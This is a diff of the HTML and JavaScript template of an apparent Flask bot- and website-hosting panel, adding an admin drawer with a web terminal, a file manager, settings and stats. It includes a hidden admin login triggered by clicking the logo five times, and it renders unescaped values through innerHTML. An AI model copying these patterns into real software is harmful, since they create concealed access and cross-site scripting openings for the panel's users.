                     <div id="fileCountDisplayWebsite"></div>
                 </div>
                 <div id="websiteGrid" class="website-grid"></div>
-                <div class="console-wrapper"><div class="console" id="websiteConsole">Select a website to see logs.</div></div>
-            </div>
-
-            <div class="user-footer">
-                <div class="f-title" id="footerTitle">{{ website_name }}</div>
-                <div class="f-sub">LOVE YOU ALL. SUPPORT KARO</div>
-                <div class="social-box">
-                    <a href="#" target="_blank" id="socialTelegram"><i class="fa-brands fa-telegram"></i></a>
-                    <a href="#" target="_blank" id="socialYoutube"><i class="fa-brands fa-youtube"></i></a>
-                    <a href="#" target="_blank" id="socialInstagram"><i class="fa-brands fa-instagram"></i></a>
-                    <a href="#" target="_blank" id="socialTiktok"><i class="fa-brands fa-tiktok"></i></a>
+                <div class="console-wrapper" style="margin-top:10px;">
+                    <div class="console" id="websiteConsole">Select a website to see logs.</div>
                 </div>
             </div>
+
+            <!-- Footer -->
+            <div class="user-footer">
+                <div class="f-title">{{ website_name }}</div>
+                <div class="f-sub">LOVE YOU ALL. SUPPORT KARO</div>
+                <div class="social-box">
+                    <a href="{{ social_links.telegram }}" target="_blank"><i class="fa-brands fa-telegram"></i></a>
+                    <a href="{{ social_links.youtube }}" target="_blank"><i class="fa-brands fa-youtube"></i></a>
+                    <a href="{{ social_links.instagram }}" target="_blank"><i class="fa-brands fa-instagram"></i></a>
+                    <a href="{{ social_links.tiktok }}" target="_blank"><i class="fa-brands fa-tiktok"></i></a>
+                </div>
+            </div>
+
         </div>
     </div>
 
-    <!-- ===== ADMIN DRAWER ===== -->
+    <!-- ============================================================ -->
+    <!--  ADMIN OVERLAY (DRAWER)                                        -->
+    <!-- ============================================================ -->
     <div class="admin-overlay" id="adminOverlay">
         <div class="admin-drawer">
-            <div class="admin-drawer-header"><h2><i class="fa-solid fa-shield-halved"></i> ADMIN PANEL</h2><button class="admin-close-btn" id="adminCloseBtn">✕</button></div>
-            <div class="admin-tabs">
-                <button class="active" data-tab="tabAdminMenu">🛠️ ADMIN</button>
-                <button data-tab="tabUserMenu">👥 USERS</button>
-                <button data-tab="tabTerminal">💻 TERMINAL</button>
-                <button data-tab="tabStats">📊 STATS</button>
+
+            <div class="admin-drawer-header">
+                <h2><i class="fa-solid fa-shield-halved" style="margin-right:8px;"></i>ADMIN PANEL</h2>
+                <button class="admin-close-btn" id="adminCloseBtn">✕</button>
             </div>
+
+            <div class="admin-tabs">
+                <button class="active" data-tab="tabAdminMenu">🛠️ ADMIN MENU</button>
+                <button data-tab="tabUserMenu">👥 USER MENU</button>
+                <button data-tab="tabTerminal">💻 TERMINAL</button>
+                <button data-tab="tabFileManager">📁 FILES</button>
+                {% if is_admin %}
+                <button data-tab="tabStats">📊 STATS</button>
+                {% endif %}
+            </div>
+
             <div class="admin-panel-content">
+                <!-- ADMIN MENU -->
                 <div id="tabAdminMenu" class="admin-tab-content active">
-                    <button class="btn-create" id="toggleCreateUserBtn" style="width:100%;margin-bottom:12px;"><i class="fa-solid fa-plus"></i> NEW USER</button>
-                    <button class="btn-create" id="editProfileBtn" style="width:100%;margin-bottom:12px;background:#4d88ff;"><i class="fa-solid fa-user-edit"></i> EDIT PROFILE</button>
-                    <button class="btn-create" id="settingsBtn" style="width:100%;margin-bottom:12px;background:#ffaa00;"><i class="fa-solid fa-gear"></i> SETTINGS</button>
+                    <button class="btn-create" id="toggleCreateUserBtn" style="width:100%;margin-bottom:12px;">
+                        <i class="fa-solid fa-plus"></i> NEW USER
+                    </button>
+                    <button class="btn-create" id="editProfileBtn" style="width:100%;margin-bottom:12px;background:#4d88ff;">
+                        <i class="fa-solid fa-user-edit"></i> EDIT PROFILE
+                    </button>
                     <div id="createUserForm">
                         <input type="text" id="newUsername" placeholder="Username" />
                         <input type="password" id="newPassword" placeholder="Password" />
-                        <input type="text" id="newExpiry" placeholder="Expiry (Days)" />
-                        <select id="newRole"><option value="user">User</option><option value="admin">Admin</option></select>
+                        <input type="text" id="newExpiry" placeholder="Expiry (Days, e.g. 1, 5, 30)" />
+                        <select id="newRole">
+                            <option value="user">User</option>
+                            <option value="admin">Admin</option>
+                        </select>
                         <button class="btn-create" id="createUserBtn" style="width:100%;">CREATE</button>
                     </div>
                     <div id="fullUserListContainer"></div>
                 </div>
+
+                <!-- USER MENU -->
                 <div id="tabUserMenu" class="admin-tab-content">
-                    <div class="section-title">👑 Admin List</div><div id="simpleAdminListContainer"></div>
-                    <div class="section-title">👤 User List</div><div id="simpleUserListContainer"></div>
+                    <div class="section-title">👑 Admin List</div>
+                    <div id="simpleAdminListContainer"></div>
+                    <div class="section-title" style="margin-top:24px;">👤 User List</div>
+                    <div id="simpleUserListContainer"></div>
                 </div>
+
+                <!-- TERMINAL -->
                 <div id="tabTerminal" class="admin-tab-content">
-                    <div class="terminal-box" id="terminalOutput"><span>$ </span>Connected...<br /></div>
+                    <div class="terminal-box" id="terminalOutput">
+                        <span class="prompt">$ </span>Connected...<br />
+                    </div>
                     <div class="terminal-controls">
-                        <input type="text" id="terminalCommand" placeholder="Type command..." />
+                        <input type="text" id="terminalCommand" placeholder="Type command or input..." />
                         <button class="btn-term-run" id="termRunBtn"><i class="fa-solid fa-play"></i> Run</button>
                         <button class="btn-term-stop" id="termStopBtn"><i class="fa-solid fa-stop"></i> Stop</button>
                         <button class="btn-term-clear" id="termClearBtn"><i class="fa-solid fa-eraser"></i> Clear</button>
                     </div>
                 </div>
+
+                <!-- FILE MANAGER -->
+                <div id="tabFileManager" class="admin-tab-content">
+                    <div class="file-breadcrumb" id="fileBreadcrumb"></div>
+                    <div class="file-manager" id="fileManagerList"></div>
+                    <div style="margin-top:10px;font-size:12px;color:#555;">Long press on item (or right-click) for actions</div>
+                </div>
+
+                <!-- STATS -->
+                {% if is_admin %}
                 <div id="tabStats" class="admin-tab-content">
-                    <div class="stats-grid">
-                        <div class="stat-card"><div class="label">Total Hours</div><div class="value" id="statTotalHours">--</div><div class="sub">Offset + Running</div></div>
-                        <div class="stat-card"><div class="label">Main Uptime</div><div class="value" id="statMainHours">--</div><div class="sub">Flask App</div></div>
-                        <div class="stat-card"><div class="label">Internal Sites</div><div class="value" id="statInternalHours">--</div><div class="sub">Subprocesses</div></div>
-                        <div class="stat-card"><div class="label">Render Services</div><div class="value" id="statRenderHours">--</div><div class="sub">Active: <span id="statRenderActive">--</span></div></div>
-                        <div class="stat-card"><div class="label">Storage Used</div><div class="value" id="statStorage">--</div><div class="sub">Free: <span id="statDiskFree">--</span> GB</div></div>
+                    <div class="stats-grid" id="statsGrid">
+                        <div class="stat-card"><div class="label">Total Hours Used</div><div class="value" id="statTotalHours">--</div><div class="sub">Offset + Running</div></div>
+                        <div class="stat-card"><div class="label">Main Container Uptime</div><div class="value" id="statMainHours">--</div><div class="sub">Flask App</div></div>
+                        <div class="stat-card"><div class="label">Internal Sites/Bots</div><div class="value" id="statInternalHours">--</div><div class="sub">Subprocesses</div></div>
+                        <div class="stat-card"><div class="label">Render External Services</div><div class="value" id="statRenderHours">--</div><div class="sub">Active: <span id="statRenderActive">--</span></div></div>
+                        <div class="stat-card"><div class="label">Storage (Uploads)</div><div class="value" id="statStorage">--</div><div class="sub">Free: <span id="statDiskFree">--</span> GB</div></div>
                         <div class="stat-card"><div class="label">Container RAM</div><div class="value" id="statRam">--</div><div class="sub"><span id="statRamUsed">--</span> MB / <span id="statRamTotal">--</span> MB</div><div class="progress-bar"><div class="fill" id="ramFill" style="width:0%;"></div></div></div>
                         <div class="stat-card"><div class="label">CPU Usage</div><div class="value" id="statCpu">--</div><div class="sub">Percent</div></div>
                     </div>
@@ -2421,11 +3785,15 @@ HTML_TEMPLATE = """
                         <div style="font-size:0.75rem;color:#666;margin-top:5px;">Render Dashboard → Usage → Total Hours Used so far.</div>
                     </div>
                 </div>
+                {% endif %}
             </div>
+
         </div>
     </div>
 
-    <!-- ===== MODALS ===== -->
+    <!-- ============================================================ -->
+    <!--  CUSTOM MODAL                                                 -->
+    <!-- ============================================================ -->
     <div class="custom-modal-overlay" id="customModalOverlay">
         <div class="custom-modal">
             <div class="modal-icon" id="modalIcon">⚠️</div>
@@ -2434,17 +3802,31 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
+    <!-- ============================================================ -->
+    <!--  SETTINGS MODAL                                               -->
+    <!-- ============================================================ -->
     <div class="custom-modal-overlay" id="settingsModalOverlay">
         <div class="custom-modal">
-            <div class="modal-icon"><i class="fa-solid fa-gear"></i></div>
+            <div class="modal-icon" style="text-align:center;color:#00e5ff;"><i class="fa-solid fa-gear"></i></div>
             <div class="modal-body" id="settingsModalBody">
                 <div class="settings-form">
-                    <label>Website Name</label><input type="text" id="settingsWebsiteName" />
-                    <label>Telegram Link</label><input type="text" id="settingsTelegram" />
-                    <label>YouTube Link</label><input type="text" id="settingsYoutube" />
-                    <label>Instagram Link</label><input type="text" id="settingsInstagram" />
-                    <label>TikTok Link</label><input type="text" id="settingsTiktok" />
-                    <label>Upload Logo</label><input type="file" id="settingsLogoInput" accept="image/*" />
+                    <label>Website Name</label>
+                    <input type="text" id="settingsWebsiteName" placeholder="Website name" />
+                    
+                    <label>Telegram Link</label>
+                    <input type="text" id="settingsTelegram" placeholder="https://t.me/..." />
+                    
+                    <label>YouTube Link</label>
+                    <input type="text" id="settingsYoutube" placeholder="https://youtube.com/..." />
+                    
+                    <label>Instagram Link</label>
+                    <input type="text" id="settingsInstagram" placeholder="https://instagram.com/..." />
+                    
+                    <label>TikTok Link</label>
+                    <input type="text" id="settingsTiktok" placeholder="https://tiktok.com/..." />
+                    
+                    <label>Upload Logo (PNG, JPG, GIF, WEBP)</label>
+                    <input type="file" id="settingsLogoInput" accept="image/*" />
                     <div id="settingsLogoPreview"></div>
                     <button class="btn-remove-logo" id="settingsRemoveLogoBtn">Remove Logo</button>
                 </div>
@@ -2456,237 +3838,812 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
+    <!-- ============================================================ -->
+    <!--  CONTEXT MENU (file manager)                                  -->
+    <!-- ============================================================ -->
+    <div class="file-context-menu" id="fileContextMenu">
+        <div class="menu-item" id="ctxDelete"><i class="fa-solid fa-trash"></i> Delete</div>
+        <div class="menu-item" id="ctxRename"><i class="fa-solid fa-pen"></i> Rename</div>
+        <div class="menu-item" id="ctxDownload"><i class="fa-solid fa-download"></i> Download</div>
+    </div>
+
     <script>
-    (function(){
-        'use strict';
+        (function() {
+            'use strict';
 
-        // ----- API HELPERS -----
-        async function apiCall(url, options = {}) {
-            const res = await fetch(url, {
-                ...options,
-                headers: { 'Content-Type': 'application/json', ...options.headers }
-            });
-            if (!res.ok) {
-                const err = await res.json().catch(() => ({}));
-                throw new Error(err.error || 'API error');
-            }
-            return res.json();
-        }
+            // ---------- GLOBAL FETCH INTERCEPTOR ----------
+            const originalFetch = window.fetch;
+            window.fetch = function(url, options) {
+                return originalFetch(url, options).then(response => {
+                    if (response.status === 401) {
+                        window.location.href = '/';
+                        return Promise.reject('Unauthorized');
+                    }
+                    return response;
+                });
+            };
 
-        // ----- CUSTOM MODAL -----
-        const modalOverlay = document.getElementById('customModalOverlay');
-        const modalIcon = document.getElementById('modalIcon');
-        const modalBody = document.getElementById('modalBody');
-        const modalActions = document.getElementById('modalActions');
+            // ---------- CUSTOM MODAL ----------
+            const modalOverlay = document.getElementById('customModalOverlay');
+            const modalIcon = document.getElementById('modalIcon');
+            const modalBody = document.getElementById('modalBody');
+            const modalActions = document.getElementById('modalActions');
 
-        function showCustomModal(icon, bodyHTML, buttons) {
-            return new Promise((resolve) => {
-                modalIcon.textContent = icon || '⚠️';
-                modalBody.innerHTML = bodyHTML || '';
-                modalActions.innerHTML = '';
-                buttons.forEach((btn) => {
-                    const buttonEl = document.createElement('button');
-                    buttonEl.textContent = btn.label;
-                    buttonEl.className = btn.className || 'btn-confirm';
-                    buttonEl.addEventListener('click', () => {
-                        closeModal();
-                        resolve(btn.value);
+            function showCustomModal(icon, bodyHTML, buttons) {
+                return new Promise((resolve) => {
+                    modalIcon.textContent = icon || '⚠️';
+                    modalBody.innerHTML = bodyHTML || '';
+                    modalActions.innerHTML = '';
+                    buttons.forEach((btn) => {
+                        const buttonEl = document.createElement('button');
+                        buttonEl.textContent = btn.label;
+                        buttonEl.className = btn.className || 'btn-confirm';
+                        buttonEl.addEventListener('click', () => {
+                            closeModal();
+                            resolve(btn.value);
+                        });
+                        modalActions.appendChild(buttonEl);
                     });
-                    modalActions.appendChild(buttonEl);
+                    modalOverlay.classList.add('open');
                 });
-                modalOverlay.classList.add('open');
-            });
-        }
-
-        window.customAlert = function(message, icon = 'ℹ️') {
-            return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
-                { label: 'OK', value: true, className: 'btn-ok' }
-            ]);
-        };
-
-        window.customConfirm = function(message, icon = '⚠️') {
-            return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
-                { label: 'Cancel', value: false, className: 'btn-cancel' },
-                { label: 'OK', value: true, className: 'btn-confirm' }
-            ]);
-        };
-
-        function closeModal() { modalOverlay.classList.remove('open'); }
-
-        // ----- DOM REFS -----
-        const loginView = document.getElementById('loginView');
-        const userView = document.getElementById('userView');
-        const adminOverlay = document.getElementById('adminOverlay');
-        const loginUsername = document.getElementById('loginUsername');
-        const loginPassword = document.getElementById('loginPassword');
-        const loginRoleSelect = document.getElementById('loginRoleSelect');
-        const loginBtn = document.getElementById('loginBtn');
-        const loginError = document.getElementById('loginError');
-        const hamburgerBtn = document.getElementById('hamburgerBtn');
-        const adminCloseBtn = document.getElementById('adminCloseBtn');
-        const logoutBtn = document.getElementById('logoutBtn');
-        const botListContainer = document.getElementById('botListContainer');
-        const botConsole = document.getElementById('botConsole');
-        const websiteGrid = document.getElementById('websiteGrid');
-        const websiteConsole = document.getElementById('websiteConsole');
-        const deployBtnWebsite = document.getElementById('deployBtnWebsite');
-        const fileInputWebsite = document.getElementById('fileInputWebsite');
-        const fileCountDisplayWebsite = document.getElementById('fileCountDisplayWebsite');
-        const uploadCardWebsite = document.getElementById('uploadCardWebsite');
-        const deployBtnBot = document.getElementById('deployBtnBot');
-        const fileInputBot = document.getElementById('fileInputBot');
-        const fileCountDisplayBot = document.getElementById('fileCountDisplayBot');
-        const uploadCardBot = document.getElementById('uploadCardBot');
-        const fullUserListContainer = document.getElementById('fullUserListContainer');
-        const simpleAdminListContainer = document.getElementById('simpleAdminListContainer');
-        const simpleUserListContainer = document.getElementById('simpleUserListContainer');
-        const toggleCreateUserBtn = document.getElementById('toggleCreateUserBtn');
-        const createUserForm = document.getElementById('createUserForm');
-        const newUsername = document.getElementById('newUsername');
-        const newPassword = document.getElementById('newPassword');
-        const newExpiry = document.getElementById('newExpiry');
-        const newRole = document.getElementById('newRole');
-        const createUserBtn = document.getElementById('createUserBtn');
-        const terminalOutput = document.getElementById('terminalOutput');
-        const terminalCommand = document.getElementById('terminalCommand');
-        const termRunBtn = document.getElementById('termRunBtn');
-        const termStopBtn = document.getElementById('termStopBtn');
-        const termClearBtn = document.getElementById('termClearBtn');
-        const settingsBtn = document.getElementById('settingsBtn');
-        const settingsModalOverlay = document.getElementById('settingsModalOverlay');
-        const settingsCancelBtn = document.getElementById('settingsCancelBtn');
-        const settingsSaveBtn = document.getElementById('settingsSaveBtn');
-        const settingsWebsiteName = document.getElementById('settingsWebsiteName');
-        const settingsTelegram = document.getElementById('settingsTelegram');
-        const settingsYoutube = document.getElementById('settingsYoutube');
-        const settingsInstagram = document.getElementById('settingsInstagram');
-        const settingsTiktok = document.getElementById('settingsTiktok');
-        const settingsLogoInput = document.getElementById('settingsLogoInput');
-        const settingsLogoPreview = document.getElementById('settingsLogoPreview');
-        const settingsRemoveLogoBtn = document.getElementById('settingsRemoveLogoBtn');
-
-        let currentUser = null;
-        let selectedBotId = null;
-        let selectedWebsiteId = null;
-        let websiteLogInterval = null;
-        let botLogInterval = null;
-        let uptimeIntervals = {};
-        let terminalPollInterval = null;
-        let isTerminalRunning = false;
-
-        // ----- LOGIN -----
-        async function handleLogin() {
-            const username = loginUsername.value.trim();
-            const password = loginPassword.value.trim();
-            const role = loginRoleSelect.value;
-            loginError.textContent = '';
-            if (!username || !password) {
-                loginError.textContent = 'Please enter username and password.';
-                return;
             }
-            try {
-                const data = await apiCall('/login', {
-                    method: 'POST',
-                    body: JSON.stringify({ username, password, role })
-                });
-                if (data.success) {
-                    currentUser = { username: data.username, role: data.role };
-                    document.querySelector('.login-card').classList.add('login-success');
-                    setTimeout(() => { location.reload(); }, 500);
+
+            window.customAlert = function(message, icon = 'ℹ️') {
+                return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
+                    { label: 'OK', value: true, className: 'btn-ok' }
+                ]);
+            };
+
+            window.customConfirm = function(message, icon = '⚠️') {
+                return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
+                    { label: 'Cancel', value: false, className: 'btn-cancel' },
+                    { label: 'OK', value: true, className: 'btn-confirm' }
+                ]);
+            };
+
+            function closeModal() {
+                modalOverlay.classList.remove('open');
+            }
+
+            // ---------- SECRET KEY LOGIN (Logo clicks) ----------
+            let loginIconClickCount = 0;
+            let loginIconTimer = null;
+
+            document.getElementById('loginIcon').addEventListener('click', function(e) {
+                loginIconClickCount++;
+                clearTimeout(loginIconTimer);
+                loginIconTimer = setTimeout(() => { loginIconClickCount = 0; }, 2000);
+
+                if (loginIconClickCount >= 5) {
+                    loginIconClickCount = 0;
+                    showSecretKeyModal();
                 }
-            } catch(e) {
-                document.querySelector('.login-card').classList.add('shake');
-                setTimeout(() => { document.querySelector('.login-card').classList.remove('shake'); }, 500);
-                loginError.textContent = e.message || 'Login failed';
-            }
-        }
-
-        async function handleLogout() {
-            const confirmed = await customConfirm('Logout?', '👋');
-            if (!confirmed) return;
-            try { await apiCall('/logout', { method: 'POST' }); } catch(_) {}
-            location.reload();
-        }
-
-        // ----- SECRET LOGIN -----
-        let loginIconClickCount = 0;
-        let loginIconTimer = null;
-        document.getElementById('loginIcon').addEventListener('click', function() {
-            loginIconClickCount++;
-            clearTimeout(loginIconTimer);
-            loginIconTimer = setTimeout(() => { loginIconClickCount = 0; }, 2000);
-            if (loginIconClickCount >= 5) {
-                loginIconClickCount = 0;
-                showSecretKeyModal();
-            }
-        });
-
-        async function showSecretKeyModal() {
-            const bodyHTML = `<div style="text-align:center;"><p style="margin-bottom:12px;">Enter Secret Key:</p><input type="password" id="secretKeyInput" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" /></div>`;
-            const result = await showCustomModal('🔑', bodyHTML, [
-                { label: 'Cancel', value: false, className: 'btn-cancel' },
-                { label: 'Login', value: true, className: 'btn-confirm' }
-            ]);
-            if (result) {
-                const secret = document.getElementById('secretKeyInput')?.value;
-                if (!secret) { await customAlert('Enter secret key.', '⚠️'); return; }
-                try {
-                    const res = await apiCall('/api/secret_login', { method: 'POST', body: JSON.stringify({ secret }) });
-                    if (res.success) location.reload();
-                    else await customAlert(res.error || 'Invalid secret', '❌');
-                } catch(e) { await customAlert('Error: ' + e.message, '❌'); }
-            }
-        }
-
-        // ----- TABS -----
-        const tabBtns = document.querySelectorAll('.tabs .tab-btn');
-        tabBtns.forEach(btn => {
-            btn.addEventListener('click', function() {
-                tabBtns.forEach(b => b.classList.remove('active'));
-                this.classList.add('active');
-                const tabId = this.dataset.tab;
-                document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
-                document.getElementById('tab-' + tabId).classList.add('active');
-                if (tabId === 'websites') loadWebsites();
-                else if (tabId === 'bots') loadBots();
-                sessionStorage.setItem('activeTab', tabId);
             });
-        });
-        const savedTab = sessionStorage.getItem('activeTab') || 'bots';
-        const savedTabBtn = document.querySelector(`.tabs .tab-btn[data-tab="${savedTab}"]`);
-        if (savedTabBtn) savedTabBtn.click();
 
-        // ----- WEBSITES -----
-        async function loadWebsites() {
-            try {
-                const res = await fetch('/api/websites');
-                const data = await res.json();
-                renderWebsites(data);
-            } catch(e) {
-                websiteGrid.innerHTML = `<div class="empty-msg">Error loading websites</div>`;
+            async function showSecretKeyModal() {
+                const bodyHTML = `
+                    <div style="text-align:center;">
+                        <p style="margin-bottom:12px;">Enter Secret Key to login as Admin:</p>
+                        <input type="password" id="secretKeyInput" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
+                    </div>
+                `;
+                const result = await showCustomModal('🔑', bodyHTML, [
+                    { label: 'Cancel', value: false, className: 'btn-cancel' },
+                    { label: 'Login', value: true, className: 'btn-confirm' }
+                ]);
+                if (result) {
+                    const secret = document.getElementById('secretKeyInput')?.value;
+                    if (!secret) {
+                        await customAlert('Enter secret key.', '⚠️');
+                        return;
+                    }
+                    try {
+                        const res = await fetch('/api/secret_login', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ secret })
+                        });
+                        const data = await res.json();
+                        if (data.success) {
+                            location.reload();
+                        } else {
+                            await customAlert(data.error || 'Invalid secret', '❌');
+                        }
+                    } catch(e) {
+                        await customAlert('Error: ' + e.message, '❌');
+                    }
+                }
             }
-        }
 
-        function renderWebsites(websites) {
-            if (!websites || websites.length === 0) {
-                websiteGrid.innerHTML = `<div class="empty-msg">No websites deployed.</div>`;
-                return;
+            // ---------- PROFILE EDIT ----------
+            const editProfileBtn = document.getElementById('editProfileBtn');
+            if (editProfileBtn) {
+                editProfileBtn.addEventListener('click', async function() {
+                    const currentUsername = '{{ username }}';
+                    const bodyHTML = `
+                        <div style="text-align:center;">
+                            <div style="font-size:20px; margin-bottom:20px;">✎ Edit Profile</div>
+                            <div style="margin-bottom:12px;">
+                                <label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Username</label>
+                                <input type="text" id="editUsername" value="${currentUsername}" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
+                            </div>
+                            <div>
+                                <label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Password (leave blank to keep current)</label>
+                                <input type="password" id="editPassword" placeholder="New password..." style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
+                            </div>
+                        </div>
+                    `;
+                    const result = await showCustomModal('✎', bodyHTML, [
+                        { label: 'Cancel', value: false, className: 'btn-cancel' },
+                        { label: 'Save', value: true, className: 'btn-confirm' }
+                    ]);
+                    if (result) {
+                        const newUsername = document.getElementById('editUsername').value.trim();
+                        const newPassword = document.getElementById('editPassword').value.trim();
+                        try {
+                            const res = await fetch('/api/profile', {
+                                method: 'PUT',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ username: newUsername, password: newPassword })
+                            });
+                            const data = await res.json();
+                            if (data.success) {
+                                if (data.logout) {
+                                    await customAlert('Profile updated! You will be logged out.', '✅');
+                                    window.location.href = '/';
+                                } else {
+                                    await customAlert('Profile updated!', '✅');
+                                    location.reload();
+                                }
+                            } else {
+                                await customAlert(data.error || 'Update failed', '❌');
+                            }
+                        } catch (e) {
+                            // handled by interceptor
+                        }
+                    }
+                });
             }
-            let html = '';
-            websites.forEach(w => {
+
+            // ---------- SETTINGS MODAL ----------
+            const settingsModalOverlay = document.getElementById('settingsModalOverlay');
+            const settingsCancelBtn = document.getElementById('settingsCancelBtn');
+            const settingsSaveBtn = document.getElementById('settingsSaveBtn');
+            const settingsWebsiteName = document.getElementById('settingsWebsiteName');
+            const settingsTelegram = document.getElementById('settingsTelegram');
+            const settingsYoutube = document.getElementById('settingsYoutube');
+            const settingsInstagram = document.getElementById('settingsInstagram');
+            const settingsTiktok = document.getElementById('settingsTiktok');
+            const settingsLogoInput = document.getElementById('settingsLogoInput');
+            const settingsLogoPreview = document.getElementById('settingsLogoPreview');
+            const settingsRemoveLogoBtn = document.getElementById('settingsRemoveLogoBtn');
+
+            let currentSettings = {};
+
+            async function loadSettings() {
+                try {
+                    const res = await fetch('/api/settings');
+                    const data = await res.json();
+                    currentSettings = data;
+                    settingsWebsiteName.value = data.website_name || 'YUVICODEX';
+                    settingsTelegram.value = data.social_links?.telegram || '#';
+                    settingsYoutube.value = data.social_links?.youtube || '#';
+                    settingsInstagram.value = data.social_links?.instagram || '#';
+                    settingsTiktok.value = data.social_links?.tiktok || '#';
+                    if (data.logo) {
+                        settingsLogoPreview.innerHTML = `<img src="${data.logo}" class="logo-preview" />`;
+                    } else {
+                        settingsLogoPreview.innerHTML = '';
+                    }
+                } catch (e) {
+                    console.error('Failed to load settings', e);
+                }
+            }
+
+            async function saveSettings() {
+                const payload = {
+                    website_name: settingsWebsiteName.value.trim() || 'YUVICODEX',
+                    social_links: {
+                        telegram: settingsTelegram.value.trim() || '#',
+                        youtube: settingsYoutube.value.trim() || '#',
+                        instagram: settingsInstagram.value.trim() || '#',
+                        tiktok: settingsTiktok.value.trim() || '#'
+                    }
+                };
+                try {
+                    const res = await fetch('/api/settings', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Settings saved successfully!', '✅');
+                        closeSettingsModal();
+                        location.reload();
+                    } else {
+                        await customAlert('Failed to save settings.', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            }
+
+            async function uploadLogo(file) {
+                const formData = new FormData();
+                formData.append('logo', file);
+                try {
+                    const res = await fetch('/api/settings/logo', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Logo uploaded!', '✅');
+                        await loadSettings();
+                        location.reload();
+                    } else {
+                        await customAlert(data.error || 'Upload failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            }
+
+            async function removeLogo() {
+                const confirmed = await customConfirm('Remove logo?', '🗑️');
+                if (!confirmed) return;
+                try {
+                    const res = await fetch('/api/settings/logo', { method: 'DELETE' });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Logo removed.', '✅');
+                        await loadSettings();
+                        closeSettingsModal();
+                        setTimeout(() => { location.reload(); }, 500);
+                    } else {
+                        await customAlert('Failed to remove logo.', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            }
+
+            function openSettingsModal() {
+                loadSettings();
+                settingsModalOverlay.classList.add('open');
+            }
+
+            function closeSettingsModal() {
+                settingsModalOverlay.classList.remove('open');
+            }
+
+            settingsCancelBtn.addEventListener('click', closeSettingsModal);
+            settingsSaveBtn.addEventListener('click', saveSettings);
+            settingsRemoveLogoBtn.addEventListener('click', removeLogo);
+            settingsLogoInput.addEventListener('change', function() {
+                if (this.files.length > 0) {
+                    uploadLogo(this.files[0]);
+                    this.value = '';
+                }
+            });
+            settingsModalOverlay.addEventListener('click', function(e) {
+                if (e.target === this) closeSettingsModal();
+            });
+
+            // ---------- DOM REFS ----------
+            const loginView = document.getElementById('loginView');
+            const userView = document.getElementById('userView');
+            const adminOverlay = document.getElementById('adminOverlay');
+
+            const loginUsername = document.getElementById('loginUsername');
+            const loginPassword = document.getElementById('loginPassword');
+            const loginRoleSelect = document.getElementById('loginRoleSelect');
+            const loginBtn = document.getElementById('loginBtn');
+            const loginError = document.getElementById('loginError');
+
+            const hamburgerBtn = document.getElementById('hamburgerBtn');
+            const adminCloseBtn = document.getElementById('adminCloseBtn');
+            const logoutBtn = document.getElementById('logoutBtn');
+
+            const botListContainer = document.getElementById('botListContainer');
+            const botConsole = document.getElementById('botConsole');
+            const websiteGrid = document.getElementById('websiteGrid');
+            const websiteConsole = document.getElementById('websiteConsole');
+
+            const uploadCardWebsite = document.getElementById('uploadCardWebsite');
+            const deployBtnWebsite = document.getElementById('deployBtnWebsite');
+            const fileInputWebsite = document.getElementById('fileInputWebsite');
+            const fileCountDisplayWebsite = document.getElementById('fileCountDisplayWebsite');
+
+            const uploadCardBot = document.getElementById('uploadCardBot');
+            const deployBtnBot = document.getElementById('deployBtnBot');
+            const fileInputBot = document.getElementById('fileInputBot');
+            const fileCountDisplayBot = document.getElementById('fileCountDisplayBot');
+
+            const fullUserListContainer = document.getElementById('fullUserListContainer');
+            const simpleAdminListContainer = document.getElementById('simpleAdminListContainer');
+            const simpleUserListContainer = document.getElementById('simpleUserListContainer');
+
+            const toggleCreateUserBtn = document.getElementById('toggleCreateUserBtn');
+            const createUserForm = document.getElementById('createUserForm');
+            const newUsername = document.getElementById('newUsername');
+            const newPassword = document.getElementById('newPassword');
+            const newExpiry = document.getElementById('newExpiry');
+            const newRole = document.getElementById('newRole');
+            const createUserBtn = document.getElementById('createUserBtn');
+
+            const terminalOutput = document.getElementById('terminalOutput');
+            const terminalCommand = document.getElementById('terminalCommand');
+            const termRunBtn = document.getElementById('termRunBtn');
+            const termStopBtn = document.getElementById('termStopBtn');
+            const termClearBtn = document.getElementById('termClearBtn');
+
+            // ---------- STATE ----------
+            let currentUser = null;
+            let selectedBotId = null;
+            let selectedWebsiteId = null;
+            let websiteLogInterval = null;
+            let botLogInterval = null;
+            let uptimeIntervals = {};
+            let terminalPollInterval = null;
+            let isTerminalRunning = false;
+
+            // ---------- API HELPERS ----------
+            async function apiCall(url, options = {}) {
+                const res = await fetch(url, {
+                    ...options,
+                    headers: { 'Content-Type': 'application/json', ...options.headers }
+                });
+                if (!res.ok) {
+                    const err = await res.json().catch(() => ({}));
+                    throw new Error(err.error || 'API error');
+                }
+                return res.json();
+            }
+
+            // ---------- LOGIN / LOGOUT ----------
+            async function handleLogin() {
+                const username = loginUsername.value.trim();
+                const password = loginPassword.value.trim();
+                const role = loginRoleSelect.value;
+                loginError.textContent = '';
+                if (!username || !password) {
